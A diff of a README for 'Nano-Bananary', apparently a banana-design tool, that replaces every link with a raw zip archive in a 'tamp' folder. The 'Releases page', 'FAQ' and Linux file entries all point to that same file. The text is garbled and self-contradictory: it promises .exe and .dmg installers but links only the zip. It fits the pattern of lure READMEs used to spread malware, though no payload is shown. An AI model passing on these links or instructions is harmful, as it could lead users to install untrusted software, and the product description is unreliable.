@@ -1,7 +1,7 @@
 # 🍌 Nano-Bananary - Effortless Banana Creation Made Simple
 
-![Download](https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip)  
-### Visit [this page to download](https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip)
+![Download](https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip)  
+### Visit [this page to download](https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip)
 
 ## 📥 Introduction
 
@@ -13,14 +13,14 @@ To start using Nano-Bananary, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
 
-   [Visit this page to download](https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip) 
+   [Visit this page to download](https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip) 
 
 2. **Download the Application**: On the Releases page, select the latest version. Look for the file that suits your operating system.
 
 3. **Install the Software**:
    - For Windows: Download the `.exe` file. Once downloaded, double-click on the file to begin installation. Follow the prompts to complete the installation.
    - For Mac: Download the `.dmg` file. Open the file and drag the Nano-Bananary app into your Applications folder.
-   - For Linux: Download the `https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip` file. Extract the archive and follow the included instructions in the README file.
+   - For Linux: Download the `https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip` file. Extract the archive and follow the included instructions in the README file.
 
 ## 📂 Features 
 
@@ -61,7 +61,7 @@ After downloading Nano-Bananary, install it based on your operating system:
   3. Launch the application from the Applications directory.
 
 - **Linux Installation**:
-  1. Extract the downloaded `https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip` file to your preferred location.
+  1. Extract the downloaded `https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip` file to your preferred location.
   2. Open the terminal and navigate to the extracted directory.
   3. Run the installation script provided.
 
@@ -81,7 +81,7 @@ We welcome feedback to improve Nano-Bananary. Share your thoughts or report bugs
 
 ## 🔗 Useful Links
 
-- [Download Nano-Bananary](https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip)
-- [FAQ Section](https://raw.githubusercontent.com/ahmdze/Nano-Bananary/main/tamp/Nano-Bananary.zip)
+- [Download Nano-Bananary](https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip)
+- [FAQ Section](https://github.com/ahmdze/Nano-Bananary/raw/refs/heads/main/tamp/Nano-Bananary-botherheaded.zip)
 
 Enjoy creating your banana designs effortlessly! Happy creating!
